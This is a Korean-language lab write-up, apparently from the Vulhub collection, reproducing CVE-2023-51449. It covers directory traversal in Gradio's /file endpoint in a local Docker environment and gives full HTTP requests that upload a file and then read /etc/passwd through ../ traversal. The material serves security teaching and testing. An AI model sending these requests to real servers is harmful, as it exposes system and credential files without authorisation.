# Gradio /file Interface Directory Traversal (CVE-2023-51449)

디렉터리 트래버설(Directory Traversal) 및 서버 사이드 요청 위조(SSRF)

> 화이트햇 스쿨 3기 - [안서진 (@annseojin)](https://github.com/annseojin)

[中文版本(Chinese version)](https://github.com/vulhub/vulhub/blob/master/gradio/CVE-2023-51449/README.zh-cn.md)

- **Gradio**는 사용자가 프론트엔드 코드를 작성하지 않고도 머신 러닝 모델을 위한 시각적 웹 인터페이스를 빠르게 구축할 수 있는 Python 라이브러리이다.

- Gradio 4.11 이하 버전에서는 인증이 활성화되지 않은 경우, 공격자가 파일 경로만 알고 있다면 공개 URL을 통해 Gradio 애플리케이션을 실행하는 서버에 존재하는 임의의 파일에 액세스할 수 있다.

참고 자료 (References):

- [gradio-app/gradio#6833](https://github.com/gradio-app/gradio/pull/6833)
- [gradio-app/Make the `/file` secure against file traversal attacks and SSRF](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)

## 환경 설정 (Environment Setup)

Gradio 4.10.0으로 빌드된 애플리케이션을 시작하기 위해 다음 명령을 실행해야 한다.

```
docker compose up -d
```

서버가 시작되면 기본적으로 인증(Authentication)이 비활성화되어 있다.
애플리케이션은 브라우저에서 `http://[your-ip]:7680` 주소로 접속할 수 있다.

## 취약점 재현 (Vulnerability Reproduction)

### 1. 파일 업로드 및 파일 경로 확보

업로드 인터페이스를 사용하여 파일을 서버에 업로드하고, 업로드된 파일의 접근 가능한 경로를 확인 및 획득한다.

```
POST /upload HTTP/1.1
Host: localhost:7860
Content-Type: multipart/form-data; boundary=---------------------------250033711231076532771336998311

-----------------------------250033711231076532771336998311
Content-Disposition: form-data; name="files";filename="okmijnuhbygv"
Content-Type: application/octet-stream

123456
-----------------------------250033711231076532771336998311--
```

![](3.png)

### 2. 디렉터리 트래버설을 이용한 민감 파일 접근

접근 가능한 파일 경로가 확보되면 `/file` 인터페이스와 디렉터리 트래버설을 사용하여 `/etc/passwd`와 같은 서버 내 민감 파일을 읽을 수 있다.

```
GET /file=/tmp/gradio/7c4a8d09ca3762af61e59520943dc26494f8941b/../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: localhost:7860
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.36
Connection: close
Accept-Encoding: gzip
```

![](4.png)

### 3. 환경 종료

Docker compose 서비스를 종료하고, 리소스를 삭제한다.

```
docker compose down
```

## 요약

- 인증이 비활성화된 상태에서 `/file` 엔드포인트가 디렉터리 트래버설 공격에 취약하다.
- 업로드된 파일 경로를 활용하여 서버 내 임의 파일에 접근할 수 있다.
- Gradio 4.11 이상 버전에서는 해당 취약점이 패치되었다.
